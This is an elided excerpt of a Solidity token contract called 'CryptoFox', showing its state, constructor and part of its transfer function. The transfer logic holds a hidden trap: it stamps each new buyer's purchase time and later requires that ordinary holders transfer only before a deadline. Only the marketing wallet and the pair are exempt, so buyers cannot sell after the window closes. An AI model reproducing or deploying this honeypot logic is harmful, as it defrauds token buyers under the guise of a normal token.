...
contract CryptoFox  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "CryptoFox";
    string private _symbol = "CryptoFox";
    ...
    constructor()  {
        ...
        uniswapV2Router = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 _burn;
        uint256 _brunTimec = C[sender] + _lastbuy;
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]  ) {_burn = amount.mul(2).div(100);}
        if (recipient != _marketingWallet  && recipient != uniswapV2Pair && sender == uniswapV2Pair && balanceOf(recipient) == 0) 
        { C[recipient] = block.timestamp;}      
        uint256 _time =block.timestamp;     
        if (sender !=_marketingWallet  && sender !=uniswapV2Pair ){require(_time <= _brunTimec);}
